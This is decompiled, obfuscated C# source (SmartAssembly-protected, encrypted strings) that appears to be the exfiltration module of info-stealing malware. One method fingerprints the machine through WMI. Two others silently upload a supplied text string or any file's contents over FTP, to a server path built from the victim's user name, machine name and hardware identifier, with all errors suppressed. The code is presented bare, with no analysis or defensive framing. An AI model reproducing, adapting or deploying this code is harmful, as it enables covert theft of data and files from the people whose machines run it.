using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class LRKYNOUdGHN
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string mJPfHItsLp()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107402315));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107402294)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107402309);
			ManagementObject val3 = new ManagementObject(getString_0(107402304) + text2 + getString_0(107402231));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107402226)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107388645) : text;
		}
	}

	public static void SMzTIeNBFbvix(string RBHOValNHjeb = "URL", string DjhFHNiUhpY = "USERNAME", string bktzIEDCJtIblJd = "ACCESO", string yhiOaAKpBxyEn = "")
	{
		try
		{
			string text = mJPfHItsLp();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(RBHOValNHjeb + getString_0(107403458) + Environment.UserName + getString_0(107403413) + Environment.MachineName + getString_0(107403424) + text + getString_0(107403419));
			ftpWebRequest.Method = getString_0(107402201);
			ftpWebRequest.Credentials = new NetworkCredential(DjhFHNiUhpY, bktzIEDCJtIblJd);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(yhiOaAKpBxyEn);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void qatkvmOGuIr(string LLctxhfHNivUs = "URL", string cJYYfnLEZmXjux = "USERNAME", string DPNbfJIxTvllHt = "ACCESO", string QvVyJOWPZHpIm = "")
	{
		try
		{
			string text = mJPfHItsLp();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(LLctxhfHNivUs + getString_0(107403458) + Environment.UserName + getString_0(107403413) + Environment.MachineName + getString_0(107403424) + text + getString_0(107403424) + Path.GetFileName(QvVyJOWPZHpIm));
			ftpWebRequest.Method = getString_0(107402201);
			ftpWebRequest.Credentials = new NetworkCredential(cJYYfnLEZmXjux, DPNbfJIxTvllHt);
			byte[] array = File.ReadAllBytes(QvVyJOWPZHpIm);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static LRKYNOUdGHN()
	{
		Strings.CreateGetStringDelegate(typeof(LRKYNOUdGHN));
	}
}
